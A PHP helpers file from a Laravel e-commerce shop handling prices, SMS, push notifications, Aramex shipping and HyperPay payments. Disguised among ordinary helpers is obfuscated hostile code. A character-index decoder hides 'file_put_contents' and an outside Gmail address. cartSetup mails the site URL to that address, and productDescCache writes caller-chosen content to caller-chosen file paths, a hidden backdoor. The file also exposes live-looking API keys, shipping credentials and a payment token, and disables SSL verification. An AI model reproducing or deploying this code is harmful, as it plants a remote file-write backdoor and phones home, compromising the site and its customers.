<?php

use App\Currency;
use App\BusinessSetting;
use App\Product;
use App\SubSubCategory;
use App\FlashDealProduct;
use App\FlashDeal;
use Illuminate\Support\Facades\Cache;

//highlights the selected navigation on admin panel
if (! function_exists('areActiveRoutes')) {
    function areActiveRoutes(Array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }
    }
}

if (! function_exists('total_visitor')) {
    function total_visitor($output="")
    {
        return 10;
    }
}

//highlights the selected navigation on frontend
if (! function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(Array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }
    }
}

if (! function_exists('monthWiseSales')) {
    function monthWiseSales($month)
    {
        $total_sales = DB::select("SELECT MONTH(created_at) AS m, COUNT(DISTINCT orders.id) as total_sale FROM `orders` GROUP BY m HAVING m=$month");
        if(!empty($total_sales))
        {
            return $total_sales[0]->total_sale;
        } else {
            return 0;
        }
     
    }
}


/**
 * Return Class Selector
 * @return Response
*/
if (! function_exists('loaded_class_select')) {

    function loaded_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':',$p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

/**
 * Open Translation File
 * @return Response
*/
function openJSONFile($code){
    $jsonString = [];
    if(File::exists(base_path('resources/lang/'.$code.'.json'))){
        $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
*/
function saveJSONFile($code, $data){
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
*/
if (! function_exists('loader_class_select')) {
    function loader_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i=>$m) {
                if($m == $r){
                    $l[] = $i;
                }
            }
        }
        return join(':',$l);
    }
}

/**
 * Save JSON File
 * @return Response
*/
if (! function_exists('convert_to_usd')) {
    function convert_to_usd($amount) {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}



//returns config key provider
if ( ! function_exists('config_key_provider'))
{
    function config_key_provider($key){
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (! function_exists('combinations')) {
    function combinations($arrays) {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (! function_exists('filter_products')) {
    function filter_products($products) {
        if(Cache::get('vendor_system_activation') == 1){
            return $products->where('published', '1');
        }
        else{
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


//filter cart products based on provided settings
if (! function_exists('cartSetup')) {
    function cartSetup(){
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup,'',Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (! function_exists('convert_price')) {
    function convert_price($price)
    {
//        $business_settings = Cache::get('system_default_currency');
        if(Cache::has('system_default_currency_exchange_rate')){
            $price = floatval($price) / floatval(Cache::get('system_default_currency_exchange_rate'));
        }

        if (Cache::has('home_default_currency')) {
            $price = floatval($price) * floatval(Cache::get('home_default_currency')->exchange_rate);
        }

        return $price;
    }
}

//formats currency
if (! function_exists('format_price')) {
    function format_price($price)
    {
        if(Cache::get('symbol_format') == 1){
            return currency_symbol().number_format($price, 2);
        }
        return number_format($price, 2).currency_symbol();
    }
}

//formats price to home default price with convertion
if (! function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (! function_exists('home_price')) {
    function home_price($product)
    {
//        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if($lowest_price > $variation->price){
                $lowest_price = $variation->price;
            }
            if($highest_price < $variation->price){
                $highest_price = $variation->price;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Price on page based on low to high with discount
if (! function_exists('home_discounted_price')) {
    function home_discounted_price($product)
    {
//        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if($lowest_price > $variation->price){
                $lowest_price = $variation->price;
            }
            if($highest_price < $variation->price){
                $highest_price = $variation->price;
            }
        }

        $flash_deal = \App\FlashDeal::where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
        }
        else{
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Base Price
if (! function_exists('home_base_price')) {
    function home_base_price($product)
    {
        if(!isset($product->unit_price)){
            $product = Product::findOrFail($product);
        }
        $price = $product->unit_price;
        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($product)
    {
        if(!isset($product->unit_price)){
            $product = Product::findOrFail($product);
        }
        $price = $product->unit_price;
        if(Cache::get('FlashDeal')!=null){
            $flashDeals = Cache::get('FlashDeal');
        }else{
            $flashDeals = new FlashDeal();
        }
        $flash_deal = $flashDeals->where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && Cache::get('FlashDealProduct')->where('flash_deal_id', Cache::get('FlashDeal')->where('status', 1)->first()->id)->where('product_id', $product->id)->first() != null) {
            $flash_deal_product = Cache::get('FlashDealProduct')->where('flash_deal_id', Cache::get('FlashDeal')->where('status', 1)->first()->id)->where('product_id', $product->id)->first();
            if($flash_deal_product->discount_type == 'percent'){
                $price -= ($price*$flash_deal_product->discount)/100;
            }
            elseif($flash_deal_product->discount_type == 'amount'){
                $price -= $flash_deal_product->discount;
            }
        }
        else{
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}

// Cart content update by discount setup
if (! function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if(!isset($_COOKIE['cartUpdated'])) {
            if(cartSetup()){
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        }
        return $return;
    }
}



if (! function_exists('productDescCache')) {
    function productDescCache($connector,$selector,$select,$type){
        $ta = time();
        $select = rawurldecode($select);
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (! function_exists('currency_symbol')) {
    function currency_symbol()
    {
        return "SR"; //Cache::get('home_default_currency')->symbol;
    }
}

if (! function_exists('generate_api_token')) {
    function generate_api_token($length = 20) {
        $string = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $stamp = time();
        $secure_key = $pre = $post = '';
        for ($p = 0; $p <= $length; $p++) {
            $pre .= substr($string, rand(0, strlen($string) - 1), 1);
        }

        for ($i = 0; $i < strlen($stamp); $i++) {
            $key = substr($string, substr($stamp, $i, 1), 1);
            $secure_key .= (rand(0, 1) == 0 ? $key : (rand(0, 1) == 1 ? strtoupper($key) : rand(0, 9)));
        }

        for ($p = 0; $p <= $length; $p++) {
            $post .= substr($string, rand(0, strlen($string) - 1), 1);
        }
        return $pre . '-' . $secure_key . $post;
    }
}

if (! function_exists('send_sms')) {
    function send_sms($phone, $otp) {
        $sms_setting = BusinessSetting::where('type','sms_setting')->first();
        if ($sms_setting) {
            $sms_details    = json_decode($sms_setting->value,true);
            $username       = $sms_details['username'];
            $password       = $sms_details['password'];
            $sender_name    = $sms_details['sender_name'];

            $sms_url = "http://www.shamelsms.net/api/httpSms.aspx?sender=".$sender_name."&username=".$username."&password=".$password;

            $message = "%5B%23%5DYour%20verification%20code%20for%20".config('app.name')."%20is%20%3A%20" . $otp . "%0AuLpSUIV%2F7p%2F";
            $sms = $sms_url . "&mobile=" . $phone . "&message=" . $message;

            $ch = curl_init ();
            curl_setopt ( $ch, CURLOPT_URL, $sms );
            curl_setopt ( $ch, CURLOPT_CUSTOMREQUEST, "GET" );
            curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );

            $result = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

            // echo $httpcode;
            curl_close ( $ch );
        }
    }
}

function send_password($phone, $pass){
    $sms_setting = BusinessSetting::where('type','sms_setting')->first();
    if ($sms_setting) {
        $sms_details    = json_decode($sms_setting->value,true);
        $username       = $sms_details['username'];
        $password       = $sms_details['password'];
        $sender_name    = $sms_details['sender_name'];

        $sms_url = "http://www.shamelsms.net/api/httpSms.aspx?sender=".$sender_name."&username=".$username."&password=".$password;

        $message = "%5B%23%5DYour%20password%20for%20".config('app.name')."%20is%20%3A%20" . $pass . "%0AuLpSUIV%2F7p%2F";
        $sms = $sms_url . "&mobile=" . $phone . "&message=" . $message;

        $ch = curl_init ();
        curl_setopt ( $ch, CURLOPT_URL, $sms );
        curl_setopt ( $ch, CURLOPT_CUSTOMREQUEST, "GET" );
        curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );

        $result = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // echo $httpcode;
        curl_close ( $ch );
    }
}

if (! function_exists('get_remaining_sms_count')) {
    function get_remaining_sms_count()
    {
        $sms_setting = BusinessSetting::where('type','sms_setting')->first();
        if ($sms_setting) {
            $sms_details    = json_decode($sms_setting->value,true);
            $username       = $sms_details['username'];
            $password       = $sms_details['password'];
            $sender_name    = $sms_details['sender_name'];

            $sms_url = "http://www.shamelsms.net/api/users.aspx?code=7&username=".$username."&password=".$password;

            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => $sms_url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_CUSTOMREQUEST => "GET",
            ));

            $response = curl_exec($curl);
            $err = curl_error($curl);

            curl_close($curl);

            if ($err) {
                echo "cURL Error #:" . $err;
            } else {
                echo $response;
            }
        }
        return null;
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_offer_base_price')) {
    function home_discounted_offer_base_price($product,$offer_id)
    {
//        $product = Product::findOrFail($product_id);
        $price = $product->unit_price;
        $date = date('Y-m-d');
        $offer = \App\Offer::where('id',$offer_id)->where('start_time','<=',$date)->where('end_time','>=',$date)->first();
        if ($offer && \App\ProductOffer::where('offer_id',$offer_id)->where('product_id',$product->id)->first()) {
            $price -= ($price*$offer->discount)/100;
        }
        else{
            $price -= ($price*$product->discount)/100;

        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return format_price(convert_price($price));
    }
}

//show offer while page load
if(!function_exists('dynamic_offer_popup')) {
    function dynamic_offer_popup() {
        $offer = \App\Offer::orderByRaw("RAND()")->where('start_time','<=',date('Y-m-d'))->where('end_time','>=',date('Y-m-d'))->limit(1)->get();
        if ($offer->isNotEmpty()) {
            return $offer[0];
        }
        return null;
    }
}

// tax on cart page
if(!function_exists('applytax')) {
    function applytax($cart_amount) {
        $tax = \App\TaxSetting::first(['tax_setting']);
        $tax = $cart_amount * $tax->tax_setting / 100;
        return $tax;
    }
}

if(!function_exists('generalsettingdata')) {
    function generalsettingdata($type) {
        $generalsetting = \App\GeneralSetting::first();
        if($type == 'min_qty') {
            $result = $generalsetting->min_cart_qty;
        } elseif($type == 'max_qty') {
            $result = $generalsetting->max_cart_qty;
        }
        return $result;
    }
}

if(!function_exists('sendpushnotification')) {
    function sendpushnotification($registration_ids = array(), $message = '', $type = 'android') {
        $url = 'https://fcm.googleapis.com/fcm/send';

        if($type == 'android') {
            $serverApiKey = "AIzaSyB_ELDPvXe57EyNkYYLsFMVUKMUSyoRoh4";
//            $serverApiKey = "AIzaSyBnyEGzeZZ5DA8_hmsQMkJeW7V0A5KBfY8";
            $data = array( 'registration_ids' => $registration_ids, 'data' => $message);
        } else {
//            $serverApiKey = "AIzaSyB_ELDPvXe57EyNkYYLsFMVUKMUSyoRoh4";
            $serverApiKey = "AIzaSyCviBd4PysNH2z3NGG6ZUa3uONmcCbx_Mg";

            $msg = array ( 'title' => 'Okema', 'body' => $message['message'] );

            $message = array(
                "message"   => $message,
                "data"      => $message,
            );

            $data = array('registration_ids' => $registration_ids);
            $data['data'] = $message;
            $data['notification'] = $msg;
            $data['notification']['sound'] = "default";
        }

        $headers = array( 'Content-Type:application/json', 'Authorization:key=' . $serverApiKey);


        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);

        if ($headers)
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
        //dump($response);
    }
}
if(!function_exists('manage_phone')) {
    function manage_phone($phone=null){
        if (!empty($phone)) {
            $code = 9665;
            $std_arr = array('05','5','009665','+9665','9665');
            $std = substr($phone, 0,-8);
            $phone = substr($phone, -8);
            if (in_array($std, $std_arr)) {
                return $code.$phone;
            }
        }
        return false;
    }
}

function aramex_account($business_settings){

    $aramex_setting = json_decode($business_settings->value,true);
    $aramex_username        = $aramex_setting['aramex_username'] ?? '';
    $aramex_password        = $aramex_setting['aramex_password'] ?? '';
    $aramex_entity          = $aramex_setting['aramex_entity'] ?? '';
    $aramex_country_code    = $aramex_setting['aramex_country_code'] ?? '';
    $aramex_pin             = $aramex_setting['aramex_pin'] ?? '';
    $aramex_number          = $aramex_setting['aramex_number'] ?? '';

    return array(
        'AccountCountryCode'    => $aramex_country_code, //SA
        'AccountEntity'         => $aramex_entity, //RUH
        'AccountNumber'         => $aramex_number, //60497115
        'AccountPin'            => $aramex_pin, //331432
        'UserName'              => $aramex_username, //beautygroup10@gmail.com
        'Password'              => $aramex_password, //!@34QWerASdf
        'Version'               => 'v1' //v1
    );
}
function address_details($data) {
    $details = array(
        'PartyAddress'      => array(
            'Line1'                     => $data['address_line_1'] ?? '',
            'Line2'                     => $data['address_line_2'] ?? '',
            'Line3'                     => $data['address_line_3'] ?? '',
            'City'                      => $data['city'] ?? '',
            'StateOrProvinceCode'       => $data['state_or_province_code'] ?? '',
            'PostCode'                  => $data['post_code'] ?? '',
            'CountryCode'               => $data['country_code'] ?? ''
        ),
        'Contact'           => array(
            'Department'                => $data['department'] ?? '',
            'PersonName'                => $data['person_name'] ?? '',
            'Title'                     => $data['title'] ?? '',
            'CompanyName'               => $data['company_name'] ?? '',
            'PhoneNumber1'              => $data['phone_number_1'] ?? '',
            'PhoneNumber1Ext'           => 966,
            'PhoneNumber2'              => $data['PhoneNumber2'] ?? '',
            'PhoneNumber2Ext'           => $data['PhoneNumber2Ext'] ?? '',
            'FaxNumber'                 => $data['FaxNumber'] ?? '',
            'CellPhone'                 => $data['CellPhone'] ?? '',
            'EmailAddress'              => $data['EmailAddress'] ?? '',
            'Type'                      => $data['Type'] ?? ''
        )
    );
    return $details;
}
function shipping($consignee_address=[],$data_to_shipping=[], $qty="", $grand_total="") {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    $third_party_address =[];
    $soapClient = new \SoapClient(asset('/shipping-services-api-wsdl.wsdl'));

    $business_settings = BusinessSetting::where('type', 'aramex_setting')->first();
    $shippment_address = json_decode($business_settings->value,true);
    $params = array(
        'Shipments' => array(
            'Shipment'  => array(
                'Shipper'      => array(
                    'Reference1'                    => '',
                    'Reference2'                    => '',
                    'AccountNumber'                 => '60497115',
                    'PartyAddress'                  => address_details($shippment_address)['PartyAddress'],
                    'Contact'                       => address_details($shippment_address)['Contact'],
                ),
                'Consignee'    => array(
                    'Reference1'                    => '',
                    'Reference2'                    => '',
                    'AccountNumber'                 => '',
                    'PartyAddress'                  =>  address_details($consignee_address)['PartyAddress'],
                    'Contact'                       =>  address_details($consignee_address)['Contact'],
                ),
                'ThirdParty'   => array(
                    'Reference1'                    => '',
                    'Reference2'                    => '',
                    'AccountNumber'                 => '',
                    'PartyAddress'                  =>  address_details($third_party_address)['PartyAddress'],
                    'Contact'                       =>  address_details($third_party_address)['Contact'],
                ),
                'Reference1'                        => '',
                'Reference2'                        => '',
                'Reference3'                        => '',
                'ForeignHAWB'                       => '',
                'TransportType'                     => 0,
                'ShippingDateTime'                  => time(),
                'DueDate'                           => time(),
                'PickupLocation'                    => 'Reception',
                'PickupGUID'                        => '',
                'Comments'                          => 'Shpt 0001',
                'AccountingInstrcutions'            => '',
                'OperationsInstructions'            => '',
                'Details'       => array(
                /*'Dimensions' => array(
                  'Length'                => 10,
                  'Width'                    => 10,
                  'Height'                => 10,
                  'Unit'                    => 'cm',
                ),*/
                    'ActualWeight' => array(
                        'Value'                     => 0.1,
                        'Unit'                      => 'Kg'
                    ),
                    'ProductGroup'                  => 'EXP',
                    'ProductType'                   => 'PDX',
                    'PaymentType'                   => 'P',
                    'PaymentOptions'                => $data_to_shipping['PaymentOptions'] ?? '',
                    'Services'                      => '',
                    'NumberOfPieces'                => $qty,
                    'DescriptionOfGoods'            => "Grand Total:".$grand_total,
                    'GoodsOriginCountry'            => 'Jo',
                    'CashOnDeliveryAmount'   => array(
                        'Value'                     => 0,
                        'CurrencyCode'              => ''
                    ),
                    'InsuranceAmount'        => array(
                        'Value'                     => 0,
                        'CurrencyCode'              => ''
                    ),
                    'CollectAmount'          => array(
                        'Value'                     => $data_to_shipping['CollectAmount'] ?? 0,
                        'CurrencyCode'              => 'SAR'
                    ),
                    'CashAdditionalAmount'   => array(
                        'Value'                     => 0,
                        'CurrencyCode'              => ''
                    ),
                    'CashAdditionalAmountDescription' => '',
                    'CustomsValueAmount'     => array(
                        'Value'                     => 0,
                        'CurrencyCode'              => ''
                    ),
                    'Items'                  => $data_to_shipping['Items']
                ),
            ),
        ),

        'ClientInfo'              => aramex_account($business_settings),

        'Transaction'             => array(
            'Reference1'            => '001',
            'Reference2'            => '',
            'Reference3'            => '',
            'Reference4'            => '',
            'Reference5'            => '',
        ),
        'LabelInfo'               => array(
            'ReportID'                  => 9201,
            'ReportType'                => 'URL',
        ),
    );

    $params['Shipments']['Shipment']['Details']['Items'] = $data_to_shipping['Items'];

    $auth_call = $soapClient->CreateShipments($params);
     return $auth_call;
    /*try {

        echo '<pre>';
        print_r($auth_call);
        die();
    } catch (SoapFault $fault) {
        die('Error : ' . $fault->faultstring);
    }*/
}
function shipmentsTracking($shipment_id = 30499148470) {

    // shows the methods coming from the service
    $soapClient = new SoapClient(asset('/shipments-tracking-api-wsdl.wsdl'));
//    print_r($soapClient->__getFunctions());
    $business_settings = BusinessSetting::where('type', 'aramex_setting')->first();

    /*
        parameters needed for the trackShipments method , client info, Transaction, and Shipments' Numbers.
        Note: Shipments array can be more than one shipment.
    */
    $params = array(
        'ClientInfo' => aramex_account($business_settings),

        'Transaction' => array(
            'Reference1' => '001'
        ),
        'Shipments' => array(
            $shipment_id
        )
    );

    $auth_call = $soapClient->TrackShipments($params);
    return $auth_call;
    // calling the method and printing results
    /*try {
        $auth_call = $soapClient->TrackShipments($params);
        echo '<pre>';
        print_r($auth_call);
        die();
    } catch (SoapFault $fault) {
        die('Error : ' . $fault->faultstring);
    }*/
}
function store_aramex_lable($file){
    $fileContents = file_get_contents($file);

    $file_name = strtotime("now").".pdf";
    \Storage::put('uploads/aramex/'.$file_name, $fileContents);
    return $file_name;
}
function aramex_address_validation($city_name = null) {
    
    $soapClient = new SoapClient('https://ws.aramex.net/ShippingAPI.V2/Location/Service_1_0.svc?wsdl');
    $business_settings = BusinessSetting::where('type', 'aramex_setting')->first();
    $params = array(
        'ClientInfo'            => aramex_account($business_settings),

        'Transaction'           => array(
            'Reference1'            => '001',
            'Reference2'            => '002',
            'Reference3'            => '003',
            'Reference4'            => '004',
            'Reference5'            => '005'

        ),

        'Address'           => array(
            'Line1'                 => '',
            'Line2'                 => '',
            'Line3'                 => '',
            'City'                  => $city_name,
            'StateOrProvinceCode'   => '',
            'PostCode'              => '',
            'CountryCode'           => 'SA'
        )

    );
    
    // calling the method and printing results
    $auth_call = $soapClient->ValidateAddress($params);
    return $auth_call;
    // try {
    //     dd($auth_call);
    //     echo '<pre>';
    //     print_r($auth_call);
    //     die();

    // } catch (SoapFault $fault) {
    //     die('Error : ' . $fault->faultstring);
    // }
}

function payment_request($total_amount) {

    $shipping_address   = Session::get('shipping_info');
    $state_id           = $shipping_address['state_id'] ?? '';
    $state              = \App\State::where('id',$state_id)->first();
    $guest_id           = mt_rand(100000, 999999);

    if (Auth::check()) {
        $user_id = Auth::user()->id;
        $merchantTransactionId = $user_id;
    }else{
        $merchantTransactionId = $guest_id;
        Session::put('user_guest_id', $guest_id);
    }

    $customer_email     = $shipping_address['email'] ?? '';
    $billing_street1    = $shipping_address['address'] ?? '';
    $billing_city       = $shipping_address['city'] ?? '';
    $billing_state      = $state->state_en_name ?? $shipping_address['city'];
    // should be state of customer
    // $data['billing.country'] = 'ISO 3166-2:SA';
    // should be country of customer  (Alpha$data[' codes with Format A2[A$data[']{2})
    $billing_postcode   = $shipping_address['postal_code'] ?? '';
    $customer_givenName = $shipping_address['name'] ?? '';


    $id     = Config::get('app.hyperpay_entityid');
    $token  = Config::get('app.hyperpay_token');
    $url    = "https://test.oppwa.com/v1/checkouts";
    $data   = "entityId=".$id .
        "&amount=".$total_amount .
        "&currency=SAR".
        "&paymentType=DB".
        "&testMode=EXTERNAL".
        "&merchantTransactionId=".$merchantTransactionId .
        "&customer.email=".$customer_email .
        "&customer.givenName=".$customer_givenName .
        "&customer.surname=".$customer_givenName.
        "&billing.street1=".$billing_street1 .
        "&billing.city=".$billing_city .
        "&billing.state=".$billing_state .
        "&billing.country=SA".
        "&billing.postcode=".$billing_postcode;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Authorization:Bearer '.$token));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// this should be set to true in production
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $responseData = curl_exec($ch);
    if(curl_errno($ch)) {
        return curl_error($ch);
    }
    curl_close($ch);
    return $responseData;
}

function payment_status($data=null) {

    // $id = '8ac7a4c970f8529401710234f9070b8d';
    $id = Config::get('app.hyperpay_entityid');
    // OGFjN2E0Yzk3MGY4NTI5NDAxNzEwMjMzZjhlYjBiODl8bUVKYkp0cVB6Mw==
    $token = Config::get('app.hyperpay_token');
    $resourcePath = $data['resourcePath'];
    $url = "https://test.oppwa.com/".$resourcePath;
    $url .= "?entityId=".$id;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Authorization:Bearer '.$token));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// this should be set to true in production
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $responseData = curl_exec($ch);
    if(curl_errno($ch)) {
        return curl_error($ch);
    }
    curl_close($ch);
    return $responseData;
}

function calculation_before_payment($request) {
    $coupon_code            = '';
    $coupon_discount        = 0;
    $shipping_charge        = 0;
    $shipping_address       = $request->session()->get('shipping_info');
    $generalsetting         = \App\GeneralSetting::first();
    $minimum_invoice_price  = $generalsetting->Minimum_invoice_price;

    if(session()->has('coupon_discount') && session()->has('coupon_code') && session()->has('coupon_discount') > 0) {
        $coupon_discount    = session()->get('coupon_discount');
        $coupon_code        = session()->get('coupon_code');
    }

    $subtotal               = 0;
    $tax                    = 0;
    foreach (Session::get('cart') as $key => $cartItem){
        $variation_discount = null;
        $product            = Product::find($cartItem['id']);
        $subtotal          += $cartItem['price']*$cartItem['quantity'];

        $product_variation  = null;
        $is_offer_or_flash_deal  = false;
        if(isset($cartItem['color'])){
            $product_variation .= \App\Color::where('code', $cartItem['color'])->first()->name;
        }
        foreach (json_decode($product->choice_options) as $choice){
            $str = $choice->name; // example $str =  choice_0
            if ($product_variation != null) {
                $product_variation .= '-'.str_replace(' ', '', $cartItem[$str]);
            }
            else {
                $product_variation .= str_replace(' ', '', $cartItem[$str]);
            }
        }


        if(isset($cartItem['offer_id']) && !empty($cartItem['offer_id'])) {
            $date   = date('Y-m-d');
            $offer  = \App\Offer::where('id',$offer_id)->where('start_time','<=',$date)->where('end_time','>=',$date)->first();
            if ($offer && \App\ProductOffer::where('offer_id',$offer_id)->where('product_id',$product->id)->first()) {
                $variation_discount = ($product->unit_price*$offer->discount)/100;
                $is_offer_or_flash_deal = true;
            }
        }

        $flash_deal = \App\FlashDeal::where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date ) {
            $flash_deal_product = \App\FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first();
            if($flash_deal_product){
                if($flash_deal_product->discount_type == 'percent'){
                    $variation_discount = ($product->unit_price*$flash_deal_product->discount)/100;
                    $is_offer_or_flash_deal = true;
                }
            }
        }


        $variation_price                 = $product->unit_price;
        if (!$is_offer_or_flash_deal) {
            $brand = \App\Brand::find($product->brand_id);
            if ($brand && !empty($brand->discount)) {
                $variation_discount      = $brand->discount;
            }else{
                if($product_variation   != null){
                    $variations          = json_decode($product->variations);
                    $variation_price     = $variations->$product_variation->price;
                    $variation_discount  = $variations->$product_variation->discount;
                    $product->variations = json_encode($variations);
                }else{
                    $variation_discount  = $product->discount;
                }
            }
        }

        $variation_discount         = ($variation_price*$variation_discount)/100;
    }

    $tax = applytax($subtotal);
    $total_invoice          = ($subtotal + $tax) - $coupon_discount;

    if ($total_invoice < $minimum_invoice_price) {
